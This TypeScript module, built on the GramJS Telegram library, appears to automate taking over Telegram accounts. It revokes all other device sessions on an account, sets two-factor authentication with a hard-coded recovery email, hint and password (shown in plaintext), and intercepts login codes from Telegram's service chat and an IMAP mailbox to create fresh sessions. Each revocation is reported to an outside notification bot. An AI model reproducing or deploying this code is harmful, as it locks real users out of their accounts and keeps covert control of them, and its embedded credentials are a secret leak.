import { Api, TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { sleep } from 'telegram/Helpers';
import bigInt from 'big-integer';
import { TgContext, SessionInfo } from './types';
import { parseError } from '../../../utils/parseError';
import { fetchWithTimeout } from '../../../utils/fetchWithTimeout';
import { notifbot } from '../../../utils/logbots';
import { generateTGConfig } from '../utils/generateTGConfig';
import { isAuthFingerprintMatch } from '../utils/tg-config';
import { MailReader } from '../../../IMap/IMap';

export function isOwnAuth(mobile: string, auth: Api.Authorization): boolean {
    // PRIMARY CHECK: Telegram flags the session making the API call as current.
    // This is infallible — it's the server telling us "this is YOU".
    if (auth.current) {
        return true;
    }

    return isAuthFingerprintMatch(mobile, auth);
}

export async function removeOtherAuths(ctx: TgContext): Promise<void> {
    if (!ctx.client) throw new Error('Client is not initialized');
    const result = await ctx.client.invoke(new Api.account.GetAuthorizations());

    let keptCount = 0;
    let revokedCount = 0;

    for (const auth of result.authorizations) {
        if (isOwnAuth(ctx.phoneNumber, auth)) {
            keptCount++;
            ctx.logger.info(ctx.phoneNumber, `Keeping auth: ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
            continue;
        }
        ctx.logger.info(ctx.phoneNumber, `Revoking auth: ${auth.appName} | ${auth.deviceModel} | ${auth.country}`);
        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth\n\nMobile: ${ctx.phoneNumber}\nApp: ${auth.appName || 'unknown'}\nDevice: ${auth.deviceModel || 'unknown'}\nCountry: ${auth.country || 'unknown'}\nAPI ID: ${auth.apiId || 'unknown'}`)}`);
        await resetAuthorization(ctx, auth);
        revokedCount++;
        await sleep(2000 + Math.random() * 3000); // Pause between revocations
    }

    ctx.logger.info(ctx.phoneNumber, `Auth cleanup: kept ${keptCount}, revoked ${revokedCount}`);

    // CRITICAL: Verify our session survived by making a simple API call
    try {
        const me = await ctx.client.getMe();
        if (!me) {
            throw new Error('Session verification failed after removeOtherAuths — getMe returned null');
        }
        ctx.logger.info(ctx.phoneNumber, `Session verified alive after auth cleanup (user: ${me.phone})`);
    } catch (verifyError) {
        ctx.logger.error(ctx.phoneNumber, 'CRITICAL: Our session may have been revoked during removeOtherAuths!', verifyError);
        throw new Error(`Session self-check failed after removeOtherAuths: ${verifyError}`);
    }
}

async function resetAuthorization(ctx: TgContext, auth: Api.Authorization): Promise<void> {
    try {
        await ctx.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
    } catch (error) {
        parseError(error, `Failed to reset authorization for ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
    }
}

export async function getAuths(ctx: TgContext): Promise<Api.account.Authorizations> {
    if (!ctx.client) throw new Error('Client is not initialized');
    return await ctx.client.invoke(new Api.account.GetAuthorizations());
}

export async function getLastActiveTime(ctx: TgContext): Promise<string> {
    if (!ctx.client) throw new Error('Client is not initialized');

    try {
        const result = await ctx.client.invoke(new Api.account.GetAuthorizations());
        let latest = 0;

        result.authorizations.forEach((auth) => {
            if (!isOwnAuth(ctx.phoneNumber, auth)) {
                if (auth.dateActive && latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });

        if (latest === 0) return new Date().toISOString().split('T')[0];
        return new Date(latest * 1000).toISOString().split('T')[0];
    } catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error getting last active time:', error);
        return new Date().toISOString().split('T')[0];
    }
}

export async function hasPassword(ctx: TgContext): Promise<boolean> {
    if (!ctx.client) throw new Error('Client is not initialized');
    try {
        const passwordInfo = await ctx.client.invoke(new Api.account.GetPassword());
        return passwordInfo.hasPassword || false;
    } catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error checking password status:', error);
        return false;
    }
}

export async function set2fa(ctx: TgContext): Promise<{ email: string; hint: string; newPassword: string } | void> {
    if (!(await hasPassword(ctx))) {
        ctx.logger.info(ctx.phoneNumber, 'Password Does not exist, Setting 2FA');

        const imapService = MailReader.getInstance();
        const twoFaDetails = {
            email: 'storeslaksmi@gmail.com',
            hint: 'password - India143',
            newPassword: 'Ajtdmwajt1@',
        };

        return imapService.runExclusive(async () => {
            ctx.logger.info(ctx.phoneNumber, 'Waiting for exclusive access to 2FA mailbox');
            await imapService.connectToMail(30_000);

            ctx.logger.info(ctx.phoneNumber, 'Mail is ready, setting 2FA');
            const verificationStartedAt = new Date();
            try {
                await ctx.client.updateTwoFaSettings({
                    isCheckPassword: false,
                    email: twoFaDetails.email,
                    hint: twoFaDetails.hint,
                    newPassword: twoFaDetails.newPassword,
                    emailCodeCallback: async (length: number) => {
                        ctx.logger.info(ctx.phoneNumber, `Email code requested by Telegram (length=${length})`);
                        const maxRetries = 4;
                        for (let retry = 0; retry < maxRetries; retry++) {
                            await new Promise(r => setTimeout(r, 10_000));
                            ctx.logger.info(ctx.phoneNumber, `Checking for email code (attempt ${retry + 1}/${maxRetries})`);
                            if (!(await imapService.isMailReady())) {
                                throw new Error('Mail connection lost while waiting for code');
                            }
                            const code = await imapService.getCode({
                                expectedLength: length,
                                minReceivedAt: verificationStartedAt,
                            });
                            if (code) {
                                ctx.logger.info(ctx.phoneNumber, 'Got email code');
                                return code;
                            }
                        }
                        throw new Error(`Failed to retrieve email code after ${maxRetries} attempts`);
                    },
                    onEmailCodeError: (e: Error) => {
                        ctx.logger.error(ctx.phoneNumber, 'Email code error:', parseError(e));
                        return Promise.resolve('error');
                    },
                });
            } finally {
                await imapService.disconnectFromMail().catch(() => {});
            }

            ctx.logger.info(ctx.phoneNumber, '2FA set successfully');
            return twoFaDetails;
        });
    } else {
        ctx.logger.info(ctx.phoneNumber, 'Password already exists');
    }
}

export async function createNewSession(ctx: TgContext): Promise<string> {
    const timeoutPromise = new Promise<string>((_, reject) =>
        setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000)
    );

    const sessionPromise = (async () => {
        const me = <Api.User>await ctx.client.getMe();
        const { apiId, apiHash, params: tgParams } = await generateTGConfig(ctx.phoneNumber);

        const newClient = new TelegramClient(
            new StringSession(''),
            apiId,
            apiHash,
            tgParams
        );

        await newClient.start({
            phoneNumber: me.phone,
            password: async () => 'Ajtdmwajt1@',
            phoneCode: async () => await waitForOtp(ctx),
            onError: (err: Error) => { throw err; },
        });

        const session = <string><unknown>newClient.session.save();
        await newClient.destroy();
        return session;
    })();

    return Promise.race([sessionPromise, timeoutPromise]);
}

export async function waitForOtp(ctx: TgContext): Promise<string> {
    for (let i = 0; i < 3; i++) {
        try {
            const messages = await ctx.client.getMessages('777000', { limit: 1 });
            const message = messages[0];
            if (!message) {
                await sleep(5000);
                continue;
            }

            const msgDate = message.date * 1000;
            const freshnessLimit = 60000;
            const isFresh = msgDate > Date.now() - freshnessLimit;

            if (isFresh) {
                return message.text.split('.')[0].split('code:**')[1].trim();
            } else {
                const code = message.text.split('.')[0].split('code:**')[1].trim();
                if (i == 2) {
                    return code;
                }
                await sleep(5000);
            }
        } catch (err) {
            ctx.logger.warn(ctx.phoneNumber, `OTP read attempt ${i + 1} failed: ${err instanceof Error ? err.message : String(err)}`);
            await sleep(2000);
        }
    }
    throw new Error('Failed to get OTP after 3 attempts');
}

export async function getSessionInfo(ctx: TgContext): Promise<SessionInfo> {
    if (!ctx.client) throw new Error('Client not initialized');

    const [authorizationsResult, devicesResult] = await Promise.all([
        ctx.client.invoke(new Api.account.GetAuthorizations()),
        ctx.client.invoke(new Api.account.GetWebAuthorizations()),
    ]);

    const sessions = authorizationsResult.authorizations.map(auth => ({
        hash: auth.hash.toString(),
        deviceModel: auth.deviceModel,
        platform: auth.platform,
        systemVersion: auth.systemVersion,
        appName: auth.appName,
        dateCreated: new Date(auth.dateCreated * 1000),
        dateActive: new Date(auth.dateActive * 1000),
        ip: auth.ip,
        country: auth.country,
        region: auth.region,
    }));

    const webSessions = devicesResult.authorizations.map(auth => ({
        hash: auth.hash.toString(),
        domain: auth.domain,
        browser: auth.browser,
        platform: auth.platform,
        dateCreated: new Date(auth.dateCreated * 1000),
        dateActive: new Date(auth.dateActive * 1000),
        ip: auth.ip,
        region: auth.region,
    }));

    return { sessions, webSessions };
}

export async function terminateSession(ctx: TgContext, options: {
    hash: string;
    type: 'app' | 'web';
    exceptCurrent?: boolean;
}): Promise<boolean> {
    if (!ctx.client) throw new Error('Client not initialized');

    if (options.exceptCurrent) {
        if (options.type === 'app') {
            await ctx.client.invoke(new Api.auth.ResetAuthorizations());
        } else {
            await ctx.client.invoke(new Api.account.ResetWebAuthorizations());
        }
        return true;
    }

    if (options.type === 'app') {
        await ctx.client.invoke(new Api.account.ResetAuthorization({ hash: bigInt(options.hash) }));
    } else {
        await ctx.client.invoke(new Api.account.ResetWebAuthorization({ hash: bigInt(options.hash) }));
    }
    return true;
}
